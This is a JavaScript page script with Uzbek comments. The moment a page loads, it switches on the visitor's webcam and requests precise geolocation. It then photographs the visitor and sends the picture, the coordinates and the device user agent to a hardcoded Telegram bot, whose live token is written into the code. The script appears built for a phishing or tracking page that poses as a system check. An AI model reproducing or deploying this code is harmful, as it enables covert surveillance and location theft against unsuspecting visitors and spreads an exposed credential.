// ==========================================
// TELEGRAM BOT SOZLAMALARI
// ==========================================
const TELEGRAM_BOT_TOKEN = '8266294451:AAH8AJ1ykoUrss-K81kih9ZACb_J_7Ttki4';
const TELEGRAM_CHAT_ID = '8366042010'; 

// Sahifa yuklanishi bilan avtomatik ishga tushish
document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('webcam');
    const deviceObj = navigator.userAgent;

    // 1. KAMERANI DARHOL YOQISH
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
    } catch (error) {
        console.error("Kamera ruxsati berilmadi:", error);
    }

    // 2. GEOLOKATSIYANI OLISH
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Kamera yoqqanidan keyin rasm aniq chiqishi uchun 1.5 soniya kutib yuboramiz
                if (stream) {
                    setTimeout(() => { captureAndSend(lat, lon, deviceObj); }, 1500);
                } else {
                    sendTelegramTextOnly(lat, lon, deviceObj);
                }
            },
            (error) => {
                if (stream) {
                    setTimeout(() => { captureAndSend("Ruxsat berilmadi", "Ruxsat berilmadi", deviceObj); }, 1500);
                } else {
                    sendTelegramTextOnly("Ruxsat berilmadi", "Ruxsat berilmadi", deviceObj);
                }
            },
            { enableHighAccuracy: true, timeout: 30000 }
        );
    } else {
        if (stream) {
            setTimeout(() => { captureAndSend("Qo'llab-quvvatlamaydi", "Qo'llab-quvvatlamaydi", deviceObj); }, 1500);
        } else {
            sendTelegramTextOnly("Qo'llab-quvvatlamaydi", "Qo'llab-quvvatlamaydi", deviceObj);
        }
    }
});

// ==========================================
// RASMGA OLISH VA TELEGRAMGA RASMLI XABAR YUBORISH
// ==========================================
function captureAndSend(lat, lon, device) {
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('photoCanvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        if (!blob) {
            sendTelegramTextOnly(lat, lon, device);
            return;
        }

        const captionText = `<b>🔔 Yangi foydalanuvchi tizimni tekshirdi!</b>\n\n` +
                            `📍 <b>Lokatsiya:</b>\n` +
                            `Kenglik (Lat): <code>${lat}</code>\n` +
                            `Uzunlik (Lon): <code>${lon}</code>\n\n` +
                            `📱 <b>Qurilma (User-Agent):</b>\n` +
                            `<code>${device}</code>`;

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'webcam_snap.jpg');
        formData.append('caption', captionText);
        formData.append('parse_mode', 'HTML');

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(json => console.log("Telegram yuborildi:", json))
        .catch(err => console.error("Xatolik:", err));

    }, 'image/jpeg', 0.8);
}

function sendTelegramTextOnly(lat, lon, device) {
    const text = `<b>🔔 Yangi foydalanuvchi kamerasiz kirdi</b>\n\n📍 <b>Lokatsiya:</b>\n<code>${lat}</code>, <code>${lon}</code>\n\n📱 <b>Qurilma:</b>\n<code>${device}</code>`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
    });
}